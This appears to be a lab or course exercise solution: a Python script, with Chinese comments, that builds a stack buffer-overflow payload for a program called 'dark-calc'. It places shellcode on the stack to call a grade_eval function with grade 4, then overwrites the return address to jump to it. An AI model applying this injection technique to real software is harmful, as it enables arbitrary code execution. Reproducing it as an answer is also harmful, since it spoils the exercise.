#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc (stack execution).

Place a short shellcode at the fixed stack address 0x721000800fd0 that
sets edi=4 and calls grade_eval(0x401a87), then overwrite input()'s
return address to jump to that shellcode.
"""
import sys

# 栈上执行的 shellcode（12 字节）：
#   mov edi, 4         ; bf 04 00 00 00   -> grade = 4
#   mov eax, 0x401a87  ; b8 87 1a 40 00   -> grade_eval 的地址
#   call rax           ; ff d0             -> 调用 grade_eval(4)
shellcode = b"\xbf\x04\x00\x00\x00" \
            b"\xb8\x87\x1a\x40\x00" \
            b"\xff\xd0"

payload = shellcode
payload += b"A" * (24 - len(shellcode))            # 补齐到 24 字节（16 expression + 8 保存 rbp）
payload += (0x721000800fd0).to_bytes(8, "little")  # 返回地址 -> 跳回栈上 shellcode

sys.stdout.buffer.write(payload)
